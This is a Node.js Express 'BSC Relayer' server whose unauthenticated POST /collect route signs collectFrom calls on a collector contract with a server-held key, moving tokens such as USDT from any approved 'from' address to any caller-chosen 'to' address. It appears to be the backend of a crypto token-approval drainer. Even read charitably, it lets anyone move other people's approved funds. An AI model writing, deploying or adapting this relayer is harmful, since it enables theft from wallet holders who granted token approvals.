import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { ethers } from "ethers";

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());

/* ================= CONFIG ================= */

const PORT = process.env.PORT || 3000;
const RPC_URL = process.env.RPC_URL || "https://bsc-dataseed.binance.org/";
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS;

if (!PRIVATE_KEY || !CONTRACT_ADDRESS) {
  console.log("❌ Missing ENV variables");
  process.exit(1);
}

/* ================= PROVIDER ================= */

const provider = new ethers.JsonRpcProvider(RPC_URL);
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

/* ================= CONTRACT ================= */

const COLLECTOR_ABI = [
  "function collectFrom(address token,address from,uint256 amount,address to) external"
];

const collectorContract = new ethers.Contract(
  CONTRACT_ADDRESS,
  COLLECTOR_ABI,
  wallet
);

/* ================= HEALTH CHECK ================= */

app.get("/", (req, res) => {
  res.send("✅ BSC Relayer Running");
});

/* ================= COLLECT ROUTE ================= */

app.post("/collect", async (req, res) => {
  try {
    const { token, from, amountHuman, to } = req.body;

    console.log("Incoming:", req.body);

    if (!token || !from || !amountHuman || !to) {
      return res.status(400).json({
        ok: false,
        error: "Missing parameters"
      });
    }

    if (!ethers.isAddress(from) || !ethers.isAddress(to)) {
      return res.status(400).json({
        ok: false,
        error: "Invalid address"
      });
    }

    // USDT decimals (BSC)
    const amountWei = ethers.parseUnits(
      amountHuman.toString(),
      18
    );

    console.log("Calling collectFrom...");
    console.log("FROM:", from);
    console.log("TO:", to);
    console.log("AMOUNT:", amountHuman);

    const tx = await collectorContract.collectFrom(
      token,
      from,
      amountWei,
      to
    );

    console.log("TX SENT:", tx.hash);

    await tx.wait();

    console.log("✅ SUCCESS");

    res.json({
      ok: true,
      hash: tx.hash
    });

  } catch (err) {
    console.error("❌ ERROR:", err);

    res.status(500).json({
      ok: false,
      error: err.reason || err.message
    });
  }
});

/* ================= START SERVER ================= */

app.listen(PORT, () => {
  console.log(`🚀 Relayer running on port ${PORT}`);
});
